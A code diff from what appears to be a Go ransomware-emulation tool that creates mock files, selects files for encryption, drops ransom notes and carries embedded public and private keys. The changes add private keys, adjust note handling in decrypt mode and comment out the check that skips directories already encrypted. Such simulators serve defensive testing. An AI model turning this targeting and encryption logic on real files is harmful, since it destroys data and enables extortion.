@@ -42,6 +42,12 @@ var publicKeys embed.FS
 var eccKeyName = "ecc_key.ecc.pub"
 var rsaKeyName = "rsa_key.rsa.pub"
 
+//go:embed ecc_key.ecc
+//go:embed rsa_key.rsa
+var privateKeys embed.FS
+var eccPrivateKeyName = "ecc_key.ecc"
+var rsaPrivateKeyName = "rsa_key.rsa"
+
 var dummy_extensions = []string{"docx", "docm", "xlsm", "xlsx", "qbw", "rar", "csv", "sln", "bin", "zip", "pdf", "txt"}
 var subdir_names = []string{"finance", "reports", "documents", "it", "exhibits", "backup"}
 var file_names = []string{"workbook", "report", "export", "timesheet", "evidence", "knowledge", "system", "adjustment", "observable", "genuine", "certificates", "judgement", "corporate", "domain", "tempest", "research", "hypothesis", "parallel"}
@@ -90,10 +96,10 @@ func parseArgs(groups []RansomActor) (map[string]any, error) {
 	ecc_public := flag.String("ecc_public", "", "Specify ECC Public-Key File to use - if blank, will use embedded key")
 	ecc_private := flag.String("ecc_private", "", "Specify ECC Private-Key File - must be specified with decrypt if asymmetric system is ECC")
 
-	// Dummy Data Creation Parameters
-	create := flag.Bool("create", false, "Create a mixture of dummy-data files in the target directory for encryption targeting - when using this, only files created by impact will be targeted for encryption, regardless of existence")
-	create_count := flag.Int("create_files", 5000, "How many dummy-files to create")
-	create_size := flag.Int("create_size", 5000, "Size in megabytes of dummy-file data to target - distributed evenly across create_files count")
+	// Mock Data Creation Parameters
+	create := flag.Bool("create", false, "Create a mixture of mock data files in the target directory")
+	create_count := flag.Int("create_files", 5000, "How many mock files to create")
+	create_size := flag.Int("create_size", 5000, "Size in megabytes of mock file data to create - distributed evenly across create_files count")
 	flag.Parse()
 
 	// If we are not listing threat actor templates or ge
@@ -534,7 +540,7 @@ func findFileTargets(targetDir string, note string, noteName string, recursive b
 			if !slices.Contains(ransomwareNoteDirs, baseDir) && !decryptEnabled && immediateNoteCreation {
 				createNote(note, noteName, baseDir)
 				ransomwareNoteDirs = append(ransomwareNoteDirs, baseDir)
-			} else if !immediateNoteCreation {
+			} else if !immediateNoteCreation && !decryptEnabled {
 				ransomwareNoteDirs = append(ransomwareNoteDirs, baseDir)
 			}
 			i, err := os.Stat(v)
@@ -587,10 +593,10 @@ func findFileTargets(targetDir string, note string, noteName string, recursive b
 						// If V is a network share, we may accidentally have multiple devices encrypting it
 						// How do we check if this folder is already encrypted?  Check if ransomware note exists
 						if info.IsDir() {
-							if doesOSEntryExist(filepath.Join(path, noteName)) && !decryptEnabled {
-								// This directory has already been encrypted
-								return filepath.SkipDir
-							}
+							/*							if doesOSEntryExist(filepath.Join(path, noteName)) && !decryptEnabled {
+														// This directory has already been encrypted
+														return filepath.SkipDir
+													}*/
 							return nil
 						}
 						if info.Size() == 0 {
@@ -653,10 +659,10 @@ func findFileTargets(targetDir string, note string, noteName string, recursive b
 						return filepath.SkipDir
 					}
 					if info.IsDir() {
-						if doesOSEntryExist(filepath.Join(path, noteName)) && !decryptEnabled {
-							// This directory has already been encrypted
-							return filepath.SkipDir
-						}
+						/*						if doesOSEntryExist(filepath.Join(path, noteName)) && !decryptEnabled {
+												// This directory has already been encrypted
+												return filepath.SkipDir
+											}*/
 						return nil
 					}
 					if info.Size() == 0 {
@@ -676,7 +682,7 @@ func findFileTargets(targetDir string, note string, noteName string, recursive b
 					if !slices.Contains(ransomwareNoteDirs, baseDir) && !decryptEnabled && immediateNoteCreation {
 						createNote(note, noteName, baseDir)
 						ransomwareNoteDirs = append(ransomwareNoteDirs, baseDir)
-					} else if !immediateNoteCreation {
+					} else if !immediateNoteCreation && !decryptEnabled {
 						ransomwareNoteDirs = append(ransomwareNoteDirs, baseDir)
 					}
 					f := File{
